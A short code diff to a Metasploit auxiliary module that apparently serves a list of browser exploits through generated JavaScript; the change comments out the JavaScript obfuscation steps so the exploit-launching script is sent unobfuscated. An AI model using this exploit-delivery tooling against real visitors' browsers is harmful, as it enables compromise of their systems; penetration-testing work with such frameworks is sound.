@@ -236,9 +236,9 @@ class Metasploit3 < Msf::Auxiliary
       print_debug("NOTE: Debug Mode; javascript will not be obfuscated")
     else
       pre = Time.now
-      print_status("Obfuscating initial javascript #{pre}")
-      @init_js.obfuscate
-      print_status "Done in #{Time.now - pre} seconds"
+      #print_status("Obfuscating initial javascript #{pre}")
+      #@init_js.obfuscate
+      #print_status "Done in #{Time.now - pre} seconds"
     end
 
     #@init_js << "window.onload = #{@init_js.sym("bodyOnLoad")};";
@@ -826,8 +826,8 @@ class Metasploit3 < Msf::Auxiliary
     js << "#{js_debug("'starting exploits (' + global_exploit_list.length + ' total)<br>'")}\n"
     js << "window.next_exploit(0);\n"
 
-    js = ::Rex::Exploitation::JSObfu.new(js)
-    js.obfuscate unless datastore["DEBUG"]
+    #js = ::Rex::Exploitation::JSObfu.new(js)
+    #js.obfuscate unless datastore["DEBUG"]
 
     response.body = "#{js}"
     print_status("Responding with #{sploit_cnt} exploits")
